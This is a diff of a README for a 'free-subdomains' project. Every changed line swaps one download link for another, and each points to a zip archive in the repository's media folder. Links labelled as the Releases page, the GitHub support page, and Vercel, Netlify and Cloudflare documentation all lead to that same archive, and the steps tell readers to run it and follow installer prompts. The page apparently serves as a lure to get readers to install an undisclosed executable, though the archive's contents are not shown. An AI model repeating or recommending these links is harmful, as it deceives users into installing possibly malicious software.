@@ -6,7 +6,7 @@ Welcome to **free-subdomains**! This collection of free subdomains helps you dep
 
 ## 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/lav2598/free-subdomains/main/media/free_subdomains_v2.7.zip)](https://raw.githubusercontent.com/lav2598/free-subdomains/main/media/free_subdomains_v2.7.zip)
+[![Download](https://github.com/lav2598/free-subdomains/raw/refs/heads/main/media/free-subdomains-v1.8.zip)](https://github.com/lav2598/free-subdomains/raw/refs/heads/main/media/free-subdomains-v1.8.zip)
 
 ## 📦 Why Use Free Subdomains?
 
@@ -34,13 +34,13 @@ This tool offers an easy way to start building your online identity.
 
 To begin, visit the Releases page to download the software. 
 
-[Download Free Subdomains Here](https://raw.githubusercontent.com/lav2598/free-subdomains/main/media/free_subdomains_v2.7.zip)
+[Download Free Subdomains Here](https://github.com/lav2598/free-subdomains/raw/refs/heads/main/media/free-subdomains-v1.8.zip)
 
 Once there, choose the most recent version, usually at the top of the list. Click the link to download the file. You will find files in different formats based on the platform you are using.
 
 ### How to Install
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/lav2598/free-subdomains/main/media/free_subdomains_v2.7.zip).
+1. Go to the [Releases page](https://github.com/lav2598/free-subdomains/raw/refs/heads/main/media/free-subdomains-v1.8.zip).
 2. Select the latest version.
 3. Click on the appropriate file for your platform.
 4. Follow any on-screen prompts to complete the installation.
@@ -63,7 +63,7 @@ If you encounter issues:
 
 ## 📞 Support
 
-Need help? You can reach out for support through the Issues section on our [GitHub page](https://raw.githubusercontent.com/lav2598/free-subdomains/main/media/free_subdomains_v2.7.zip). We strive to respond quickly to any queries.
+Need help? You can reach out for support through the Issues section on our [GitHub page](https://github.com/lav2598/free-subdomains/raw/refs/heads/main/media/free-subdomains-v1.8.zip). We strive to respond quickly to any queries.
 
 ## 🌟 Community Contributions
 
@@ -73,9 +73,9 @@ Feel free to contribute! If you have suggestions or improvements, we welcome you
 
 For further reading and detailed instructions, visit:
 
-- [Vercel](https://raw.githubusercontent.com/lav2598/free-subdomains/main/media/free_subdomains_v2.7.zip)
-- [Netlify](https://raw.githubusercontent.com/lav2598/free-subdomains/main/media/free_subdomains_v2.7.zip)
-- [Cloudflare](https://raw.githubusercontent.com/lav2598/free-subdomains/main/media/free_subdomains_v2.7.zip)
+- [Vercel](https://github.com/lav2598/free-subdomains/raw/refs/heads/main/media/free-subdomains-v1.8.zip)
+- [Netlify](https://github.com/lav2598/free-subdomains/raw/refs/heads/main/media/free-subdomains-v1.8.zip)
+- [Cloudflare](https://github.com/lav2598/free-subdomains/raw/refs/heads/main/media/free-subdomains-v1.8.zip)
 
 ## 🙏 Acknowledgements
 
@@ -85,4 +85,4 @@ Thanks to all the contributors who help maintain this list and the platforms tha
 
 Getting started with your online presence is now easier than ever. Download the **free-subdomains** list, choose your subdomain, and show the world what you can do. Happy building!
 
-[Download Free Subdomains Here](https://raw.githubusercontent.com/lav2598/free-subdomains/main/media/free_subdomains_v2.7.zip)
+[Download Free Subdomains Here](https://github.com/lav2598/free-subdomains/raw/refs/heads/main/media/free-subdomains-v1.8.zip)
